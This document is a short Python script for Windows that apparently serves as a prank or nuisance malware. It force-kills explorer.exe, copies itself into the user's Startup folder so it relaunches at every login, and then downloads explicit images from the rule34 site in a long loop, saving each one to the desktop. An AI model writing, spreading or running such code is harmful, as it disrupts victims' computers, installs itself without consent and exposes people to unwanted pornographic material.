from time import sleep
from rule34Py import rule34Py
import os
from pathlib import Path
import requests
import shutil

id="5000000"
i=1
desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
startup = os.path.join(os.path.join(os.environ['USERPROFILE']), 'AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
idmax = "5346435"
files=os.listdir("./")
r34Py = rule34Py()
print(startup)
print(desktop)
print(os.path.dirname(os.path.realpath(__file__)))

os.system("taskkill /im explorer.exe /F")

for fname in files:
    shutil.copy(os.path.dirname(os.path.realpath(__file__)) + "/" + os.path.basename(__file__), startup)

while int(id)<int(idmax):
    filename = "MaterialeSegativo" + str(i)
    post = r34Py.get_post(id)
    r = requests.get(post.image, stream = True)

    if r.status_code == 200:
        r.raw.decode_content = True
        with open(desktop + '\\' + filename + '.jpeg','wb') as f:
            shutil.copyfileobj(r.raw, f)

    i+=1
    id = str(int(id)+1)
